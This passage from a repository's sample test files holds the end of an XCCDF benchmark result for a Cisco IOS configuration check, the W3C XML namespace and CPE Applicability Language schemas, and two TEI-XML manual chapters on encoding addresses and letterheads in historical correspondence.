        <cdf:fact name="urn:xccdf:fact:OS:IOS">1</cdf:fact>
        <cdf:fact name="urn:xccdf:fact:OS:IOS:12">1</cdf:fact>
        <cdf:fact name="urn:xccdf:fact:OS:IOS:12:3">1</cdf:fact>
        <cdf:fact name="urn:xccdf:fact:OS:IOS:12:3:14T">1</cdf:fact>
        <cdf:fact type="string" name="urn:xccdf:fact:OS:IOS:relname">
           12.3(14)T
        </cdf:fact>
    </cdf:target-facts>
    <cdf:set-value idref="exec-timeout-time">10</cdf:set-value>
    <cdf:rule-result idref ="ios12-no-finger-service" 
                     time="2004-09-25T13:45:00-04:00">
        <cdf:result>pass</cdf:result>
    </cdf:rule-result>
    <cdf:rule-result idref ="req-exec-timeout" 
                     time="2004-09-25T13:45:06-04:00">
        <cdf:result>pass</cdf:result>
        <cdf:override time="2004-09-25T13:59:00-04:00"
                   authority="Neal Ziring">
          <cdf:old-result>fail</cdf:old-result>
          <cdf:new-result>pass</cdf:new-result>
          <cdf:remark>Test override</cdf:remark>
        </cdf:override>
        <cdf:instance context="line">console</cdf:instance>
        <cdf:fix>
             line console
             exec-timeout 10 0
        </cdf:fix>
    </cdf:rule-result>
    <cdf:rule-result idref="ios12-no-finger-service">
      <cdf:result>notselected</cdf:result>
    </cdf:rule-result>
    <cdf:score system="urn:xccdf:model:default">67.5</cdf:score>
    <cdf:score system="urn:xccdf:model:flat" maximum="214">
       157.5
    </cdf:score>
  </cdf:TestResult>

</cdf:Benchmark>
</file>

<file path="sample_data/test_files/small/scap/xccdf_1.2_bundle_2_xml.xsd">
<?xml version='1.0'?>
<!DOCTYPE xs:schema PUBLIC "-//W3C//DTD XMLSCHEMA 200102//EN" "XMLSchema.dtd" >
<xs:schema targetNamespace="http://www.w3.org/XML/1998/namespace" xmlns:xs="http://www.w3.org/2001/XMLSchema" xml:lang="en">

 <xs:annotation>
  <xs:documentation>
   See http://www.w3.org/XML/1998/namespace.html and
   http://www.w3.org/TR/REC-xml for information about this namespace.

    This schema document describes the XML namespace, in a form
    suitable for import by other schema documents.  

    Note that local names in this namespace are intended to be defined
    only by the World Wide Web Consortium or its subgroups.  The
    following names are currently defined in this namespace and should
    not be used with conflicting semantics by any Working Group,
    specification, or document instance:

    base (as an attribute name): denotes an attribute whose value
         provides a URI to be used as the base for interpreting any
         relative URIs in the scope of the element on which it
         appears; its value is inherited.  This name is reserved
         by virtue of its definition in the XML Base specification.

    lang (as an attribute name): denotes an attribute whose value
         is a language code for the natural language of the content of
         any element; its value is inherited.  This name is reserved
         by virtue of its definition in the XML specification.
  
    space (as an attribute name): denotes an attribute whose
         value is a keyword indicating what whitespace processing
         discipline is intended for the content of the element; its
         value is inherited.  This name is reserved by virtue of its
         definition in the XML specification.

    Father (in any context at all): denotes Jon Bosak, the chair of 
         the original XML Working Group.  This name is reserved by 
         the following decision of the W3C XML Plenary and 
         XML Coordination groups:

             In appreciation for his vision, leadership and dedication
             the W3C XML Plenary on this 10th day of February, 2000
             reserves for Jon Bosak in perpetuity the XML name
             xml:Father
  </xs:documentation>
 </xs:annotation>

 <xs:annotation>
  <xs:documentation>This schema defines attributes and an attribute group
        suitable for use by
        schemas wishing to allow xml:base, xml:lang or xml:space attributes
        on elements they define.

        To enable this, such a schema must import this schema
        for the XML namespace, e.g. as follows:
        &lt;schema . . .>
         . . .
         &lt;import namespace="http://www.w3.org/XML/1998/namespace"
                    schemaLocation="http://www.w3.org/2001/03/xml.xsd"/>

        Subsequently, qualified reference to any of the attributes
        or the group defined below will have the desired effect, e.g.

        &lt;type . . .>
         . . .
         &lt;attributeGroup ref="xml:specialAttrs"/>
 
         will define a type which will schema-validate an instance
         element with any of those attributes</xs:documentation>
 </xs:annotation>

 <xs:annotation>
  <xs:documentation>In keeping with the XML Schema WG's standard versioning
   policy, this schema document will persist at
   http://www.w3.org/2001/03/xml.xsd.
   At the date of issue it can also be found at
   http://www.w3.org/2001/xml.xsd.
   The schema document at that URI may however change in the future,
   in order to remain compatible with the latest version of XML Schema
   itself.  In other words, if the XML Schema namespace changes, the version
   of this document at
   http://www.w3.org/2001/xml.xsd will change
   accordingly; the version at
   http://www.w3.org/2001/03/xml.xsd will not change.
  </xs:documentation>
 </xs:annotation>

 <xs:attribute name="lang" type="xs:language">
  <xs:annotation>
   <xs:documentation>In due course, we should install the relevant ISO 2- and 3-letter
         codes as the enumerated possible values . . .</xs:documentation>
  </xs:annotation>
 </xs:attribute>

 <xs:attribute name="space" default="preserve">
  <xs:simpleType>
   <xs:restriction base="xs:NCName">
    <xs:enumeration value="default"/>
    <xs:enumeration value="preserve"/>
   </xs:restriction>
  </xs:simpleType>
 </xs:attribute>

 <xs:attribute name="base" type="xs:anyURI">
  <xs:annotation>
   <xs:documentation>See http://www.w3.org/TR/xmlbase/ for
                     information about this attribute.</xs:documentation>
  </xs:annotation>
 </xs:attribute>

 <xs:attributeGroup name="specialAttrs">
  <xs:attribute ref="xml:base"/>
  <xs:attribute ref="xml:lang"/>
  <xs:attribute ref="xml:space"/>
 </xs:attributeGroup>

</xs:schema>
</file>

<file path="sample_data/test_files/small/scap/xccdf_1.2_bundle_3_cpe-language_2.3.xsd">
<?xml version="1.0" encoding="UTF-8"?>
<xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:cpe="http://cpe.mitre.org/language/2.0"
    xmlns:cpe-name="http://cpe.mitre.org/naming/2.0" xmlns:sch="http://purl.oclc.org/dsdl/schematron"
    targetNamespace="http://cpe.mitre.org/language/2.0" elementFormDefault="qualified"
    attributeFormDefault="unqualified" version="2.3">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" schemaLocation="http://www.w3.org/2001/xml.xsd"/>
    <xsd:import namespace="http://cpe.mitre.org/naming/2.0" schemaLocation="http://scap.nist.gov/schema/cpe/2.3/cpe-naming_2.3.xsd"/>
    <xsd:annotation>
        <xsd:documentation xml:lang="en">This XML Schema defines the CPE Applicability Language. An individual CPE Name
            addresses a single part of an actual system. To identify more complex platform types, there needs to be a
            way to combine different CPE Names using logical operators. For example, there may be a need to identify a
            platform with a particular operating system AND a certain application. The CPE Applicability Language exists
            to satisfy this need, enabling the CPE Name for the operating system to be combined with the CPE Name for
            the application. For more information, consult the CPE Applicability Language Specification document. </xsd:documentation>
        <xsd:appinfo>
            <schema>CPE Applicability Language</schema>
            <author>Neal Ziring, Andrew Buttner, David Waltermire</author>
            <version>2.3</version>
            <date>2011-07-29</date>
        </xsd:appinfo>
        <xsd:appinfo>
            <!-- Declare the namespaces for schematron -->
            <sch:ns prefix="cpe" uri="http://cpe.mitre.org/language/2.0"/>
        </xsd:appinfo>
    </xsd:annotation>

    <!-- =============================================================================== -->
    <!-- =============================================================================== -->
    <!-- =============================================================================== -->
    <xsd:element name="platform-specification" type="cpe:platformSpecificationType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">This element is the root element of a CPE Applicability Language XML
                document and therefore acts as a container for child platform definitions.</xsd:documentation>
        </xsd:annotation>
        <xsd:key name="platformKey">
            <xsd:selector xpath="cpe:platform"/>
            <xsd:field xpath="@id"/>
        </xsd:key>
    </xsd:element>

    <xsd:element name="platform" type="cpe:PlatformType"/>
    <xsd:element name="platform-configuration" type="cpe:PlatformBaseType"/>

    <xsd:element name="logical-test" type="cpe:LogicalTestType">
        <xsd:annotation>
            <xsd:appinfo>
                <sch:pattern id="nonexistent-child">
                    <sch:rule context="cpe:logical-test">
                        <sch:assert
                            test="count(cpe:logical-test) > 0 or count(cpe:fact-ref) > 0 or count(cpe:check-fact-ref) > 0"
                            >All logical-test elements must contain one or more child logical-test, fact-ref, and/or
                            check-fact-ref elements.</sch:assert>
                    </sch:rule>
                </sch:pattern>
            </xsd:appinfo>
        </xsd:annotation>
    </xsd:element>

    <xsd:element name="fact-ref" type="cpe:CPEFactRefType"/>
    <xsd:element name="check-fact-ref" type="cpe:CheckFactRefType"/>

    <!-- =============================================================================== -->
    <!-- =========================== PLATFORM SPECIFICATION ============================ -->
    <!-- =============================================================================== -->
    <xsd:complexType name="platformSpecificationType">
        <xsd:sequence>
            <xsd:element ref="cpe:platform" minOccurs="1" maxOccurs="unbounded"/>
        </xsd:sequence>
    </xsd:complexType>

    <!-- =============================================================================== -->
    <!-- ==================================  PLATFORM  ================================= -->
    <!-- =============================================================================== -->
    <xsd:complexType name="PlatformBaseType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The description or qualifications of a particular IT platform type. The
                platform is defined by the logical-test child element.</xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="title" type="cpe:TextType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A human-readable title for a platform. To support uses intended for
                        multiple languages, the title element supports the ‘xml:lang’ attribute. At most one title
                        element can appear for each language.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="remark" type="cpe:TextType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">An additional description. To support uses intended for multiple
                        languages, the remark element supports the ‘xml:lang’ attribute. There can be multiple remarks
                        for a single language.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element ref="cpe:logical-test" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Definition of test using logical operators (AND, OR,
                        negate).</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
    </xsd:complexType>
    <xsd:complexType name="PlatformType">
        <xsd:complexContent>
            <xsd:extension base="cpe:PlatformBaseType">
                <xsd:attribute name="id" type="xsd:anyURI" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A locally unique name for the platform. There is no defined
                            format for this id; however, it must be unique within the containing CPE Applicability
                            Language document.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>
    <xsd:complexType name="LogicalTestType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The logical-test element appears as a child of a platform element, and may
                also be nested to create more complex logical tests. The content consists of one or more elements:
                fact-ref, check-fact-ref, and logical-test children are permitted. The operator to be applied, and
                optional negation of the test, are given as attributes.</xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="logical-test" type="cpe:LogicalTestType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Definition of complex logical test using AND, OR, and/or negate
                        operators. Evaluates to a TRUE, FALSE, or ERROR result. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element ref="cpe:fact-ref" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A reference to a bound form of a WFN; the reference always
                        evaluates to a boolean result. The bound name contained within a fact-ref is meant to describe a
                        possible set of products and is not meant to identify a unique product
                        class.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element ref="cpe:check-fact-ref" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A reference to a check that always evaluates to TRUE, FALSE, or
                        ERROR. Examples of types of checks are OVAL and OCIL checks.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="operator" type="cpe:operatorEnumeration" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The operator applied to the results of evaluating the fact-ref,
                    check-fact-ref, and logical-test elements. The permitted operators are "AND" and
                    "OR".</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="negate" type="xsd:boolean" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Whether the result of applying the operator should be negated. Possible
                    values are "TRUE" and "FALSE". This does not apply if the initial result is
                    ERROR.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>
    <xsd:complexType name="FactRefType">
        <xsd:attribute name="description" type="xsd:normalizedString" use="optional"/>
    </xsd:complexType>
    <xsd:complexType name="CPEFactRefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">A reference to a CPE Name that always evaluates to a Boolean
                result.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cpe:FactRefType">
                <xsd:attribute name="name" type="cpe:namePattern" use="required"/>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>
    <xsd:complexType name="CheckFactRefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">A reference to a check that always evaluates to a TRUE, FALSE, or ERROR
                result.</xsd:documentation>
            <xsd:documentation xml:lang="en">The CheckFactRefType complex type is used to define an element for holding
                information about an individual check. It includes a checking system specification URI, string content
                identifying the check content to invoke, and an external reference. The checking system specification
                should be the URI that uniquely identifies a revision of a check system language, and the id-ref will be
                an identifier of a test written in that language. The external reference should be used to point to the
                content in which the check identifier is defined.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cpe:FactRefType">
                <xsd:attribute name="system" type="xsd:anyURI" use="required"/>
                <xsd:attribute name="href" type="xsd:anyURI" use="required"/>
                <xsd:attribute name="id-ref" type="xsd:token" use="required"/>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <!-- =============================================================================== -->
    <!-- ===============================  ENUMERATIONS  ================================ -->
    <!-- =============================================================================== -->
    <xsd:simpleType name="operatorEnumeration">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The OperatorEnumeration simple type defines acceptable operators. Each
                operator defines how to evaluate multiple arguments.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="AND"/>
            <xsd:enumeration value="OR"/>
        </xsd:restriction>
    </xsd:simpleType>
    <!-- =============================================================================== -->
    <!-- ==============================  SUPPORTING TYPES  ============================== -->
    <!-- =============================================================================== -->
    <xsd:complexType name="TextType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">This type allows the xml:lang attribute to associate a specific language
                with an element's string content.</xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute ref="xml:lang"/>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>
    <!-- =============================================================================== -->
    <!-- ================================  ID PATTERNS  ================================ -->
    <!-- =============================================================================== -->
    <xsd:simpleType name="namePattern">
        <xsd:union memberTypes="cpe-name:cpe22Type cpe-name:cpe23Type"/>
    </xsd:simpleType>
    <!-- ================================================== -->
    <!-- =====  Change History  -->
    <!-- ================================================== -->
    <!--
        v2.2 - Initial working version
        v2.3 - Various refactoring of types to use element refs.  This enables more fine-grained reuse of this schema and allows XSD substitution to be possible.
                Updated the name pattern.
    -->
</xsd:schema>
</file>

<file path="sample_data/test_files/small/tei/tei-addresses.xml">
<?xml version="1.0" encoding="UTF-8"?><TEI xmlns="http://www.tei-c.org/ns/1.0" xml:id="addresses">
   <teiHeader>
      <fileDesc>
         <titleStmt>
            <title>Addresses</title>
            <author key="trautmann">Marjam Trautmann</author>
         </titleStmt>
         <publicationStmt>
            <publisher>Berlin-Brandenburg Academy of Sciences and Humanities</publisher>
            <date when="2020-01-28"/>
            <idno type="urn">urn:nbn:de:kobv:b4-20200421172505303-5921001-2</idno>
            <idno type="url">https://encoding-correspondence.bbaw.de/v1/addresses.html</idno>
            <idno type="zotero">https://www.zotero.org/groups/2248469/encoding_correspondence/items/itemKey/TFR6AZQS</idno>
         </publicationStmt>
         <seriesStmt>
            <title type="main">Encoding Correspondence.</title>
            <title type="sub">A Manual for encoding letters and postcards in TEI-XML and
               DTABf</title>
            <editor>Stefan Dumont</editor>
            <editor>Susanne Haaf</editor>
            <editor>Sabine Seifert</editor>
            <idno type="urn">urn:nbn:de:kobv:b4-20200110163329488-8695229-7</idno>
            <idno type="url">https://encoding-correspondence.bbaw.de/v1/</idno>
            <biblScope unit="edition">v1</biblScope>
         </seriesStmt>
         <sourceDesc>
            <p>Born digital.</p>
         </sourceDesc>
      </fileDesc>
      <revisionDesc>
         <listChange>
            <change n="1" when="2020-01-28" status="draft">Initial Version</change>
         </listChange>
      </revisionDesc>
   </teiHeader>
   <text>
      <body>
         <div xml:id="c-1">
            <head>Introduction</head>
            <p n="1">Regarding the current Guidelines of the Text Encoding Initiative P5, the element
                  <gi>address</gi> contains a postal address, e.g. of a publisher, an organization
               or an individual.<note n="1" xml:id="fn1"><ref target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-address.html">https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-address.html</ref>.</note>
               Several children of the <gi>address</gi> element are available, depending on the
               modules which are integrated in the schema. When applying the <gi>address</gi>
               element and its inherent attributes and child elements, there are three central and
               problematic issues regarding the encoding of addresses in letters and postcards.</p>
         </div>
         <div xml:id="c-2">
            <head>Issue 1: Missing attribute @type for the <gi>address</gi> element</head>
            <p n="2">Letters, postcards or telegrams have a sender and an addressee. In some cases both
               addresses are mentioned in the correspondence and are part of the transcription, not
               only of the metadata. Here, it would be convenient to be able to distinguish the
               address of the sender from the one of the addressee, or of any other person mentioned
               in the text. Furthermore, it might be necessary to distinguish between a private
               address and a business address, or between postal and e-mail address.</p>
            <p n="3">For the metadata, the <gi>correspAction</gi> element can be used that has a type
               attribute either with the value 'sent' or 'received'.<note n="2" xml:id="fn2"><ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-correspAction.html">https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-correspAction.html</ref>.</note>
               In the transcription, however, there is the need of the attribute @type for the
                  <gi>address</gi> element, which is not allowed according to the TEI P5 Guidelines.
               One possibility could be to add the element <gi>address</gi> to the class
               'att.typed'. Currently, this lack can only be filled with several constructions,
               often by adding an attribute @type to structural elements like <gi>div</gi> or
                  <gi>ab</gi>.</p>
            <figure>
               <head>Example 1: Field postcard (source: Franz Marc to Herwarth Walden, 13 November
                  1914, in: Der STURM. Digitale Quellenedition zur Geschichte der internationalen
                  Avantgarde, <ref target="https://sturm-​edition.de/id/Q.01.19141113.FMA.01">https://sturm-​edition.de/id/Q.01.19141113.FMA.01</ref>.</head>
               <graphic url="../images/addresses/example1.png"/>
            </figure>
            <p n="4">The addresses of both sender and recipient in example 1 could be encoded like
                  this:<note n="3" xml:id="fn3">Encoding taken from <ref target="https://sturm-edition.de/api/files/Q.01.19141113.FMA.01.xml">https://sturm-edition.de/api/files/Q.01.19141113.FMA.01.xml</ref>.</note>
            </p>
            <p n="5"><egXML xmlns="http://www.tei-c.org/ns/Examples">
                  <div type="address">
                     <ab type="sender">
                        <address>
                           <addrLine>U. Off. Marc</addrLine>
                           <addrLine>Bayr. Ersatz Division</addrLine>
                           <addrLine>1. Ers. Abt. (Schilling)</addrLine>
                           <addrLine>des 1. Feld-A. Rgt.</addrLine>
                           <addrLine>Leichte-Munitions-Kolonne</addrLine>
                        </address>
                     </ab>
                     <ab type="recipient">
                        <address>
                           <addrLine>Herrn</addrLine>
                           <addrLine>Herwarth W<hi rend="underline">ald</hi>en</addrLine>
                           <addrLine>Verlag „Sturm“</addrLine>
                           <addrLine>Berlin W. 9.</addrLine>
                           <addrLine>134/a Potsdamerstrasse</addrLine>
                        </address>
                     </ab>
                  </div>
               </egXML></p>
            <p n="6">In this example, the addresses of sender and recipient are distinguished from one
               another by using the <gi>ab</gi> element with a @type attribute containing the values
               'sender' and 'recipient'. The <gi>div</gi> element, however, is used to differentiate
               between parts of the texts like the address and the content of the postcard, again
               with a @type attribute.</p>
            <p n="7">This leads to the second issue, the problem of the <gi>address</gi> element being not
               allowed before <gi>opener</gi> or after <gi>closer</gi>. Finally, we want to discuss
               the encoding of address transcriptions within the elements <gi>opener</gi> or
                  <gi>closer</gi> in order to implement the current standard.</p>
         </div>
         <div xml:id="c-3">
            <head>Issue 2: <gi>address</gi> before <gi>opener</gi> and after <gi>closer</gi></head>
            <p n="8">The <gi>address</gi> element is not part of the content model of <gi>div</gi>. This
               means that it cannot appear directly inside a <gi>div</gi> and this also means that
               it is not allowed before model.divTopPart or after model.divBottomPart elements, e.g.
                  <gi>opener</gi> or after <gi>closer</gi>. So, if the encoder wants to model the
               addresses of recipient(s) and sender(s) as a separate structural block within the
                  <gi>text</gi> element and wants to put the addresses before the <gi>opener</gi> or
               after <gi>closer</gi> of a letter, he or she needs to construct an elaborate data
               model with the addresses and the <gi>opener</gi>/<gi>closer</gi> encoded in several
                  <gi>div</gi> elements:</p>
            <p n="9"><egXML xmlns="http://www.tei-c.org/ns/Examples">
                  <body>
                     <div type="address">
                        <ab type="sender">
                           <address>
                              <addrLine>U. Off. Marc</addrLine>
                              <addrLine>Bayr. Ersatz Division</addrLine>
                              <addrLine>1. Ers. Abt. (Schilling)</addrLine>
                              <addrLine>des 1. Feld-A. Rgt.</addrLine>
                              <addrLine>Leichte-Munitions-Kolonne</addrLine>
                           </address>
                        </ab>
                        <ab type="recipient">
                           <address>
                              <addrLine>Herrn</addrLine>
                              <addrLine>Herwarth W<hi rend="underline">ald</hi>en</addrLine>
                              <addrLine>Verlag „Sturm“</addrLine>
                              <addrLine>Berlin W. 9.</addrLine>
                              <addrLine>134/a Potsdamerstrasse</addrLine>
                           </address>
                        </ab>
                     </div>
                     <pb xml:id="S.193r" n="193r" facs="http://resolver.staatsbibliothek-berlin.de/SBB0000DAB200000002"/>
                     <div type="content">
                        <opener>
                           <dateline> Ha - - <date when="1914-11-13">13 XI/14</date>
                           </dateline>
                           <salute>Lieber <persName>Walden</persName>, </salute>
                        </opener>
                     </div>
                  </body>
               </egXML></p>
            <p n="10">In the encoding example above, the <gi>address</gi> element is part of an <gi>ab</gi>
               element inside a <gi>div</gi> element with the attribute @type="address". In order to
               place the transcription of the addresses and the transcription of the remaining
               content at the same semantic level, the separation of the transcriptions in
                  <gi>div</gi> siblings was chosen. Instead of <gi>div</gi> one could choose the
               element <gi>ab</gi> but in the example the <gi>ab</gi> element is used to identify
               the sender or addressee.</p>
            <p n="11">To avoid such an unnecessary elaborate encoding, it would be convenient to be able to
               use <gi>address</gi> directly inside a <gi>div</gi>. Could a possible solution be to
               assign the element <gi>address</gi> to a suitable additional class, like
               model.divTopPart and model.divBottomPart?<note n="4" xml:id="fn4"><ref target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-model.divTopPart.html">https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-model.divTopPart.html</ref>,
                     <ref target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-model.divBottomPart.html">https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-model.divBottomPart.html</ref>.</note>
               We would like to put this question to the community for further discussion.</p>
            <p n="12">What other actual coding possibilities could be used to label the address
               transcriptions of correspondence without separating them from the transcription of
               the remaining letter by <gi>div</gi> structures? A proposal for discussion is given
               in the following section.</p>
         </div>
         <div xml:id="c-4">
            <head>Issue 3: <gi>address</gi> within <gi>opener</gi> or <gi>closer</gi>
            </head>
            <p n="13">Another solution could be to include the transcription of the address in the
                  <gi>opener</gi> or <gi>closer</gi>. Here, the <gi>address</gi> element is allowed.
               The <gi>opener</gi> "combines date line, author, salutation and similar phrases that
               are used at the beginning of a section, especially in a letter".<note n="5" xml:id="fn5"><ref target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-opener.html">https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-opener.html</ref>.</note>
               The <gi>closer</gi> contains "greeting formulas, date lines and similar phrases that
               appear at the end of a section, especially in a letter".<note n="6" xml:id="fn6"><ref target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-closer.html">https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-closer.html</ref>.</note>
               This variant would make the division of the transcribed correspondence text into
               individual <gi>div</gi> and/or <gi>ab</gi> elements obsolete and would be a slimmer
               version of the above issue.</p>
            <p n="14">Example 1 with <gi>address</gi> encoded within <gi>opener</gi>:</p>
            <egXML xmlns="http://www.tei-c.org/ns/Examples">
               <body>
                  <opener>
                     <address type="sender">
                        <addrLine>U. Off. Marc</addrLine>
                        <addrLine>Bayr. Ersatz Division</addrLine>
                        <addrLine>1. Ers. Abt. (Schilling)</addrLine>
                        <addrLine>des 1. Feld-A. Rgt.</addrLine>
                        <addrLine>Leichte-Munitions-Kolonne</addrLine>
                     </address>
                     <address type="recipient">
                        <addrLine>Herrn</addrLine>
                        <addrLine>Herwarth W<hi rend="underline">ald</hi>en</addrLine>
                        <addrLine>Verlag "Sturm"</addrLine>
                        <addrLine>Berlin W. 9.</addrLine>
                        <addrLine>134/a Potsdamerstrasse</addrLine>
                     </address>
                     <dateline> Ha - - <date when="1914-11-13">13 XI/14</date>
                     </dateline>
                     <salute>Lieber <persName>Walden</persName>,</salute>
                  </opener>
                  <p><!--text of letter--></p>
               </body>
            </egXML>
            <p n="15">For establishing a standard for encoding postal addresses in <gi>opener</gi> or
                  <gi>closer</gi>, a modification of the definition of these two elements remains to
               be considered. As it is now, the postal addresses are interpreted as 'similar
               phrases'. In view of the concrete and also frequent use case a reformulation would be
               welcome (e.g. 'combines postal addresses, date line, author, salutation and similar
               phrases')—should it be decided to use this way as standard of address encoding. To
               distinguish the addresses of recipients and senders it is recommended to introduce an
               @type for <gi>address</gi>—as already explained in Issue 1.</p>
         </div>
         <div xml:id="c-5">
            <head>Proposal</head>
            <p n="16">Considering the discussed issues, editing of the TEI Guidelines regarding the
                  <gi>address</gi> element seems to be recommended concerning the inclusion of the
               attribute @type for the <gi>address</gi> element with indivually chosen values
               (possibly 'sender', 'recipient'/'receiver', 'private_address' or 'business_address'
               etc.). Furthermore, it should probably be added to the class 'att.typed'.</p>
            <p n="17">For the development of a TEI standard for encoding the transcription of addresses, we
               first considered the idea of using the <gi>address</gi> element directly within an
                  <gi>div</gi> element to avoid the use of further child elements inside
                  <gi>div</gi>. Here we want to discuss whether it would be useful to assign it to
               suitable classes, for example model.divTopPart and model.divBottomPart.</p>
            <p n="18">To get around the separation of transcriptions into different <gi>div</gi> structures
               according to the current Guidelines, we propose in Issue 3 as an alternative to code
               the addresses of sender and receiver within <gi>opener</gi> or <gi>closer</gi>. For
               this, we propose to adapt the definition of <gi>opener</gi> and <gi>closer</gi> for
               the application to postal addresses. We are looking forward to further suggestions
               and proposals by the community for the development of a standard to encode addresses
               in correspondences.</p>
         </div>
      </body>
   </text>
</TEI>
</file>

<file path="sample_data/test_files/small/tei/tei-pre-printed-parts.xml">
<?xml version="1.0" encoding="UTF-8"?><TEI xmlns="http://www.tei-c.org/ns/1.0" xml:id="pre-printed-parts">
   <teiHeader>
      <fileDesc>
         <titleStmt>
            <title>Pre-printed parts: Letterheads and forms</title>
            <author key="seifert">Sabine Seifert</author>
            <author key="schenk">Nicolas Schenk</author>
         </titleStmt>
         <publicationStmt>
            <publisher>Berlin-Brandenburg Academy of Sciences and Humanities</publisher>
            <date when="2019-12-14"/>
            <idno type="urn">urn:nbn:de:kobv:b4-20200110163911057-9256446-7</idno>
            <idno type="url">https://encoding-correspondence.bbaw.de/v1/pre-printed-parts.html</idno>
            <idno type="zotero">https://www.zotero.org/groups/2248469/encoding_correspondence/items/itemKey/HRW8FC25</idno>
         </publicationStmt>
         <seriesStmt>
            <title type="main">Encoding Correspondence.</title>
            <title type="sub">A manual for encoding letters and postcards in TEI-XML and
               DTABf</title>
            <editor>Stefan Dumont</editor>
            <editor>Susanne Haaf</editor>
            <editor>Sabine Seifert</editor>
            <idno type="urn">urn:nbn:de:kobv:b4-20200110163329488-8695229-7</idno>
            <idno type="url">https://encoding-correspondence.bbaw.de/v1/</idno>
            <biblScope unit="edition">v1</biblScope>
         </seriesStmt>
         <sourceDesc>
            <p>Born digital.</p>
         </sourceDesc>
      </fileDesc>
      <revisionDesc>
         <listChange>
            <change n="1" when="2019-12-14" status="draft">Initial Version</change>
         </listChange>
      </revisionDesc>
   </teiHeader>
   <text>
      <body>
         <div xml:id="c-1">
            <head xml:id="introduction">Introduction</head>
            <p n="1">Correspondence materials often contain pre-printed parts for which there are no
               sufficient or satisfying encoding recommendations in the TEI Guidelines. These
               pre-printed parts can be divided into two categories. First, there is the typical
               case of letterheads, usually with name and address of the sender, maybe including a
               company emblem, family crest or other kind of symbol. And second, there are
               pre-printed parts similar to printed forms, for example address fields with labels
               and dotted lines to fill in on postcards, envelopes, or letters.</p>
            <p n="2">Both cases represent pre-printed parts but constitute semantically different
               phenomena. It is, therefore, necessary to make a basic distinction between these two
               cases regarding their encoding in TEI.</p>
         </div>
         <div xml:id="c-2">
            <head xml:id="letterheads">Case 1: Letterheads</head>
            <div xml:id="c-2-1">
               <head xml:id="issue1-1">Issue 1: Using <gi>fw</gi></head>
               <p n="3"> One suggested possibility to encode letterheads is using the element
                     <gi>fw</gi>.<note n="1" xml:id="fn1">For this and the discussion of encoding
                     letterheads see the TEI-L Mailinglist: <ref target="http://tei-l.970651.n3.nabble.com/correspondence-encoding-problems-letter-headings-td4029408.html">http://tei-l.970651.n3.nabble.com/correspondence-encoding-problems-letter-headings-td4029408.html</ref>.
                  </note> The TEI Guidelines define <gi>fw</gi> as follows:</p>
               <cit>
                  <quote><gi>fw</gi> (forme work) contains a running head (e.g. a header, footer),
                     catchword, or similar material appearing on the current page.</quote>
                  <ref target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-fw.html">https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-fw.html</ref>
               </cit>
               <p n="4">Next to running heads and footers, i.e. titles of chapters in printed books,
                  this element is also intended for page numbers, catchwords, and "other material
                  repeated from page to page, which falls outside the stream of the text".<note n="2" xml:id="fn2">
                     <ref target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/PH.html#PHSK">Chapter 11.6 "Headers, Footers, and Similar Matter"</ref> of the TEI
